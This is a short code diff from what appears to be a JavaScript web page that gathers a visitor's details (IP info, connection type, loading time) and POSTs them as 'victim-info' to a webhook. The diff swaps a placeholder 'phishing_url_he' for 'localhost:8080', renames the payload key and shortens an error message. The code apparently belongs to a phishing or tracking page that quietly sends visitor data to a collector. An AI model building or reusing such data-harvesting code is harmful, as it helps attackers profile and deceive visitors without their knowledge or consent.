@@ -90,9 +90,9 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "phishing_url_he"
-                const payload = {'victim_info': ipinfo};
+                const webhookURL = "localhost:8080";
 
+                const payload = {'victim-info': ipinfo}; 
                 fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -102,7 +102,7 @@ Loading Time: ${loadTime}
                     if (response.ok) {
                         document.getElementById("messageForm").reset();
                     } else {
-                        console.error("Failed to send message.");
+                        console.error("ERROR");
                     }
                 })
                 .catch(error => console.error("Error:", error));
